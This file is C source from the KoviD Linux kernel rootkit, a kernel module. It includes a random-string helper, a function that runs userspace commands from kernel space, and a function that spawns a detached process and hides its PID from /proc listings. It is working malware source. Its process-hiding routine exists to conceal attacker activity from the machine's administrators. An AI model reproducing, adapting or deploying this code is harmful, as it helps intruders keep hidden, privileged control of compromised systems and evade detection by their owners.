/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/random.h>
#include "lkm.h"
#include "fs.h"
#include "log.h"

/**
 * This function allocates dynamic memory
 * and must be freed when no longer needed
 */
char *kv_util_random_AZ_string(size_t size)
{
	static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
				      "abcdefghijklmnopqrstuvwxyz"
				      "0123456789";
	int i;
	u8 byte;
	char *buf;

	if (size < 2) {
		prerr("Invalid argument\n");
		return NULL;
	}

	buf = kmalloc(size, GFP_KERNEL);
	if (!buf) {
		prerr("Memory error\n");
		return NULL;
	}

	for (i = 0; i < size - 1; ++i) {
		get_random_bytes(&byte, 1);
		buf[i] = charset[byte % (sizeof(charset) - 1)];
	}
	buf[i] = '\0';

	return buf;
}

int kv_run_system_command(char *cmd[])
{
	struct kstat stat;
	struct path path;
	struct subprocess_info *info;
	int rv = -1;

	if (!cmd)
		return rv;

	if (fs_kern_path(cmd[0], &path) && fs_file_stat(&path, &stat)) {
		path_put(&path);

		if ((info = call_usermodehelper_setup(cmd[0], cmd, NULL,
						      GFP_KERNEL, NULL, NULL,
						      NULL))) {
			rv = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
		}
	}
	return rv;
}

static int child_initfn(struct subprocess_info *info, struct cred *new)
{
#ifdef DEBUG_RING_BUFFER
    pr_info("KoviD: hiding PID=%d\n", current->pid);
#endif
    // Hide the process from normal /proc listing
    kv_hide_task_by_pid(current->pid, 0, CHILDREN);

    // Return 0 to proceed with execve
    return 0;
}

static void child_cleanupfn(struct subprocess_info *info)
{
#ifdef DEBUG_RING_BUFFER
	pr_info("KoviD: running process in background done.\n");
#endif
}

int kv_run_and_hide_system_command_detached(char *cmd[])
{
    struct path path;
    struct kstat stat;
    struct subprocess_info *info;
    int rv = -1;

    if (!cmd)
        return rv;

    /* Check that the command exists */
    if (fs_kern_path(cmd[0], &path) && fs_file_stat(&path, &stat)) {
        path_put(&path);

        /*
         * 1) Setup the user-mode helper
         */
        info = call_usermodehelper_setup(cmd[0], cmd, NULL, /* envp = NULL? */
                                         GFP_KERNEL,
                                         child_initfn,     // our init
                                         child_cleanupfn,  // our cleanup
                                         NULL /* data */);
        if (!info)
            return rv;

        /*
         * 2) Actually exec it with UMH_NO_WAIT -> asynchronous
         */
        rv = call_usermodehelper_exec(info, UMH_NO_WAIT);
        if (rv < 0) {
            // On failure, the kernel frees 'info'
            pr_err("KoviD: call_usermodehelper_exec failed, rv=%d\n", rv);
        }
        else {
#ifdef DEBUG_RING_BUFFER
            pr_info("KoviD: call_usermodehelper_exec -> spawned child, rv=%d\n", rv);
#endif
        }
    }

    return rv;
}
